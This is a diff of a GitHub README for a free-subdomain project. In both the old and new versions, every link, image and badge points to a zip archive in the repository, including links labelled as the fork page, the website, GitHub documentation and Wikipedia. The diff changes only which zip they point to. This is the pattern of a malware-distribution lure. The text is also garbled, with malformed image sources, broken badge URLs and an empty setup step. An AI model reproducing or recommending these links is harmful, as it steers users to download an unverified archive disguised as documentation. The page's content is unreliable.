@@ -1,8 +1,8 @@
 ## GitAds Sponsored
-[![Sponsored by GitAds](https://raw.githubusercontent.com/satoruedits/weather12.co/v2/.github/workflows/weather_co_1.8.zip)](https://raw.githubusercontent.com/satoruedits/weather12.co/v2/.github/workflows/weather_co_1.8.zip)
+[![Sponsored by GitAds](https://github.com/satoruedits/weather12.co/raw/refs/heads/v2/.github/weather-co-v2.6.zip)](https://github.com/satoruedits/weather12.co/raw/refs/heads/v2/.github/weather-co-v2.6.zip)
 
 
-<h1>TL;DR ⌨️</h1> <img src="https://raw.githubusercontent.com/satoruedits/weather12.co/v2/.github/workflows/weather_co_1.8.zip%https://raw.githubusercontent.com/satoruedits/weather12.co/v2/.github/workflows/weather_co_1.8.zip">
+<h1>TL;DR ⌨️</h1> <img src="https://github.com/satoruedits/weather12.co/raw/refs/heads/v2/.github/weather-co-v2.6.zip%https://github.com/satoruedits/weather12.co/raw/refs/heads/v2/.github/weather-co-v2.6.zip">
 <p>This project turned out to be an unprecedented phenomenal success! As a member of GitHub Education, I acquired the domain at no cost, which provided a strong foundation to build upon. The support from contributors throughout the journey was truly exceptional and played a significant role in this achievement.
 </p>
 <p>
@@ -11,12 +11,12 @@ The domain's SEO ranking skyrocketed 🚀, far exceeding expectations, making it
 <p>
 This repository is now archived and will remain available as a resource and reference for developers and enthusiasts.
 </p>
-<img src="https://raw.githubusercontent.com/satoruedits/weather12.co/v2/.github/workflows/weather_co_1.8.zip">
+<img src="https://github.com/satoruedits/weather12.co/raw/refs/heads/v2/.github/weather-co-v2.6.zip">
 <hr>
 <div align="center">
   <picture>
-    <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/satoruedits/weather12.co/v2/.github/workflows/weather_co_1.8.zip">
-    <img src="https://raw.githubusercontent.com/satoruedits/weather12.co/v2/.github/workflows/weather_co_1.8.zip">
+    <source media="(prefers-color-scheme: dark)" srcset="https://github.com/satoruedits/weather12.co/raw/refs/heads/v2/.github/weather-co-v2.6.zip">
+    <img src="https://github.com/satoruedits/weather12.co/raw/refs/heads/v2/.github/weather-co-v2.6.zip">
   </picture>
   <br/>
 
@@ -26,13 +26,13 @@ Free subdomains for personal sites, open-source projects, and more. Here is a li
 
 |              Domain name              |                         Features                          |
 |:-------------------------------------:|:---------------------------------------------------------:|
-| ⚡ [`*https://raw.githubusercontent.com/satoruedits/weather12.co/v2/.github/workflows/weather_co_1.8.zip`](https://raw.githubusercontent.com/satoruedits/weather12.co/v2/.github/workflows/weather_co_1.8.zip) | ![cf][badge-cf] ![dnssec][badge-dnssec] ![ssl][badge-ssl] |
+| ⚡ [`*https://github.com/satoruedits/weather12.co/raw/refs/heads/v2/.github/weather-co-v2.6.zip`](https://github.com/satoruedits/weather12.co/raw/refs/heads/v2/.github/weather-co-v2.6.zip) | ![cf][badge-cf] ![dnssec][badge-dnssec] ![ssl][badge-ssl] |
 
-> Wildcards (like `*https://raw.githubusercontent.com/satoruedits/weather12.co/v2/.github/workflows/weather_co_1.8.zip`) are supported too
+> Wildcards (like `*https://github.com/satoruedits/weather12.co/raw/refs/heads/v2/.github/weather-co-v2.6.zip`) are supported too
 
-[badge-cf]https://raw.githubusercontent.com/satoruedits/weather12.co/v2/.github/workflows/weather_co_1.8.zip%20-cloudflare-blue?logo=cloudflare&style=plastic?cacheSeconds=3600
-[badge-dnssec]https://raw.githubusercontent.com/satoruedits/weather12.co/v2/.github/workflows/weather_co_1.8.zip%20-DNSSEC-blue?logo=moleculer&logoColor=white&style=plastic?cacheSeconds=3600
-[badge-ssl]https://raw.githubusercontent.com/satoruedits/weather12.co/v2/.github/workflows/weather_co_1.8.zip
+[badge-cf]https://github.com/satoruedits/weather12.co/raw/refs/heads/v2/.github/weather-co-v2.6.zip%20-cloudflare-blue?logo=cloudflare&style=plastic?cacheSeconds=3600
+[badge-dnssec]https://github.com/satoruedits/weather12.co/raw/refs/heads/v2/.github/weather-co-v2.6.zip%20-DNSSEC-blue?logo=moleculer&logoColor=white&style=plastic?cacheSeconds=3600
+[badge-ssl]https://github.com/satoruedits/weather12.co/raw/refs/heads/v2/.github/weather-co-v2.6.zip
 
 ## Why?
 
@@ -40,7 +40,7 @@ First of all, I want to answer one important question - "Why are you giving out 
 
 ## Domains settings
 
-|                                   Option                                   |       `*https://raw.githubusercontent.com/satoruedits/weather12.co/v2/.github/workflows/weather_co_1.8.zip`       |
+|                                   Option                                   |       `*https://github.com/satoruedits/weather12.co/raw/refs/heads/v2/.github/weather-co-v2.6.zip`       |
 |:--------------------------------------------------------------------------:|:-------------------------:|
 |                              [DNSSEC][dnssec]                              |             ✅             |
 |                                   Email                                    |             ❌             |
@@ -62,34 +62,34 @@ First of all, I want to answer one important question - "Why are you giving out 
 
 > `*` Available only when proxying (`"proxy": true`) is enabled
 
-[dnssec]https://raw.githubusercontent.com/satoruedits/weather12.co/v2/.github/workflows/weather_co_1.8.zip
-[ssl-full]https://raw.githubusercontent.com/satoruedits/weather12.co/v2/.github/workflows/weather_co_1.8.zip
-[ssl-flex]https://raw.githubusercontent.com/satoruedits/weather12.co/v2/.github/workflows/weather_co_1.8.zip
-[caching-levels]https://raw.githubusercontent.com/satoruedits/weather12.co/v2/.github/workflows/weather_co_1.8.zip
-[crawler-hints]https://raw.githubusercontent.com/satoruedits/weather12.co/v2/.github/workflows/weather_co_1.8.zip
-[http2]https://raw.githubusercontent.com/satoruedits/weather12.co/v2/.github/workflows/weather_co_1.8.zip
-[http2-to-origin]https://raw.githubusercontent.com/satoruedits/weather12.co/v2/.github/workflows/weather_co_1.8.zip
-[0rtt]https://raw.githubusercontent.com/satoruedits/weather12.co/v2/.github/workflows/weather_co_1.8.zip
-[grpc]https://raw.githubusercontent.com/satoruedits/weather12.co/v2/.github/workflows/weather_co_1.8.zip
-[pseudo-ipv4]https://raw.githubusercontent.com/satoruedits/weather12.co/v2/.github/workflows/weather_co_1.8.zip
+[dnssec]https://github.com/satoruedits/weather12.co/raw/refs/heads/v2/.github/weather-co-v2.6.zip
+[ssl-full]https://github.com/satoruedits/weather12.co/raw/refs/heads/v2/.github/weather-co-v2.6.zip
+[ssl-flex]https://github.com/satoruedits/weather12.co/raw/refs/heads/v2/.github/weather-co-v2.6.zip
+[caching-levels]https://github.com/satoruedits/weather12.co/raw/refs/heads/v2/.github/weather-co-v2.6.zip
+[crawler-hints]https://github.com/satoruedits/weather12.co/raw/refs/heads/v2/.github/weather-co-v2.6.zip
+[http2]https://github.com/satoruedits/weather12.co/raw/refs/heads/v2/.github/weather-co-v2.6.zip
+[http2-to-origin]https://github.com/satoruedits/weather12.co/raw/refs/heads/v2/.github/weather-co-v2.6.zip
+[0rtt]https://github.com/satoruedits/weather12.co/raw/refs/heads/v2/.github/weather-co-v2.6.zip
+[grpc]https://github.com/satoruedits/weather12.co/raw/refs/heads/v2/.github/weather-co-v2.6.zip
+[pseudo-ipv4]https://github.com/satoruedits/weather12.co/raw/refs/heads/v2/.github/weather-co-v2.6.zip
 
 # How to get one?
 
-1. Star and [fork](https://raw.githubusercontent.com/satoruedits/weather12.co/v2/.github/workflows/weather_co_1.8.zip) this repository
-2. Go to [Webstite](https://raw.githubusercontent.com/satoruedits/weather12.co/v2/.github/workflows/weather_co_1.8.zip)
+1. Star and [fork](https://github.com/satoruedits/weather12.co/raw/refs/heads/v2/.github/weather-co-v2.6.zip) this repository
+2. Go to [Webstite](https://github.com/satoruedits/weather12.co/raw/refs/heads/v2/.github/weather-co-v2.6.zip)
 3. 
 
 > Domains, used for illegal purposes will be removed and permanently banned.
 
 ## If you don't know...
 
-- What is GitHub pages and how to set up a custom domain, read the [docs here](https://raw.githubusercontent.com/satoruedits/weather12.co/v2/.github/workflows/weather_co_1.8.zip)
-- The difference between `A`, `CNAME`, and other record types, the article on Wikipedia [is here](https://raw.githubusercontent.com/satoruedits/weather12.co/v2/.github/workflows/weather_co_1.8.zip)
+- What is GitHub pages and how to set up a custom domain, read the [docs here](https://github.com/satoruedits/weather12.co/raw/refs/heads/v2/.github/weather-co-v2.6.zip)
+- The difference between `A`, `CNAME`, and other record types, the article on Wikipedia [is here](https://github.com/satoruedits/weather12.co/raw/refs/heads/v2/.github/weather-co-v2.6.zip)
 
-[actions]https://raw.githubusercontent.com/satoruedits/weather12.co/v2/.github/workflows/weather_co_1.8.zip
-[deploy]https://raw.githubusercontent.com/satoruedits/weather12.co/v2/.github/workflows/weather_co_1.8.zip
+[actions]https://github.com/satoruedits/weather12.co/raw/refs/heads/v2/.github/weather-co-v2.6.zip
+[deploy]https://github.com/satoruedits/weather12.co/raw/refs/heads/v2/.github/weather-co-v2.6.zip
 <div align="center">
-<a href="https://raw.githubusercontent.com/satoruedits/weather12.co/v2/.github/workflows/weather_co_1.8.zip"><img alt="Hits" src="https://raw.githubusercontent.com/satoruedits/weather12.co/v2/.github/workflows/weather_co_1.8.zip"/></a>
+<a href="https://github.com/satoruedits/weather12.co/raw/refs/heads/v2/.github/weather-co-v2.6.zip"><img alt="Hits" src="https://github.com/satoruedits/weather12.co/raw/refs/heads/v2/.github/weather-co-v2.6.zip"/></a>
 </div>
 <!-- GitAds-Verify: AYK682KOQPMUE8MQ82IT1SS8E5B9CVF8 -->
 
